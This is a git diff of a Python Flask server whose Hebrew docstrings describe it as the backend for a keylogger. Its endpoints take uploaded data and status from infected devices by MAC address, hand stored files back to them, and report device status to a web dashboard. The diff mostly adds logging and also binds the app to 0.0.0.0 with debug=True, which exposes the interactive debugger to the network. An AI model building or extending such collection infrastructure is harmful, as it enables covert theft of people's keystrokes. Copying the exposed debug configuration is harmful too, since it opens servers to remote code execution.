@@ -32,7 +32,8 @@ def write_to_json(name_j, data):
 
 @app.route('/api/status/update', methods=['POST'])
 def status_update():
-    """ מקבל נתוני סטטוס ושומר בקובץ לפי כתובת ה-MAC """
+    print("/api/status/update")
+    """ מקבל נתוני סטטוס מהקיי לוגר ושומר בקובץ לפי כתובת ה-MAC """
     try:
         data = request.get_json()
         if not data:
@@ -53,7 +54,8 @@ def status_update():
 
 @app.route('/api/data/upload', methods=['POST'])
 def data_upload():
-    """ קבלת נתונים מהלקוח ושמירתם לפי כתובת ה-MAC """
+    """ קבלת נתונים מהקיי לוגר ושמירתם לפי כתובת ה-MAC """
+    print("/api/data/upload")
     try:
         data = request.get_json()
         if not data:
@@ -73,7 +75,8 @@ def data_upload():
 
 @app.route('/api/data/files', methods=['GET'])
 def get_data():
-    """ שליפת נתונים מהשרת לפי כתובת MAC """
+    """ שליפת נתונים מהשרת עבור הקיי לוגר לפי כתובת MAC """
+    print("/api/data/files")
     mac_address = request.headers.get("mac_address")
     if not mac_address:
         return jsonify({"error": "Missing mac_address in headers"}), 400
@@ -88,9 +91,11 @@ def get_data():
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
 
+
 @app.route('/api/status/all', methods=['GET'])
 def get_status_all():
-    """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים """
+    """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים עבור הדף אינטרנט """
+    print("/api/status/all")
     try:
         with open("evice_status.json", "r", encoding="utf-8") as file:
             data_json = json.load(file)
@@ -101,9 +106,11 @@ def get_status_all():
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
 
+
 @app.route('/api/status/check', methods=['GET'])
 def check_status():
-    """ בדיקת הסטטוס האחרון של המכשיר לפי MAC """
+    """ בדיקת (מהקיי לוגר) הסטטוס האחרון של המכשיר לפי MAC ע"י הקיי לוגר """
+    print("/api/status/check")
     mac_address = request.headers.get("mac_address")
     if not mac_address:
         return jsonify({"error": "Missing mac_address in headers"}), 400
@@ -127,6 +134,7 @@ def check_status():
 @app.route('/api/status/change', methods=['POST'])
 def change_status():
     """ מקבל נתוני סטטוס מהאתר ושומר בקובץ לפי כתובת ה-MAC """
+    print("api/status/change")
     try:
         data = request.get_json()
         if not data:
@@ -138,16 +146,17 @@ def change_status():
 
         status = {mac_address: data}
         write_to_json("change_device_status", status)
-        print("📥 נתונים שהתקבלו:", data)
+        print("📥 Received data:", data)
         return jsonify({"message": "Success"}), 200
     except FileNotFoundError:
         return jsonify({"error": "Status file not found"}), 500
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
     except Exception as e:
-        print("❌ שגיאה:", e)
+        print("❌ Error:", e)
         return jsonify({"error": str(e)}), 500
 
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
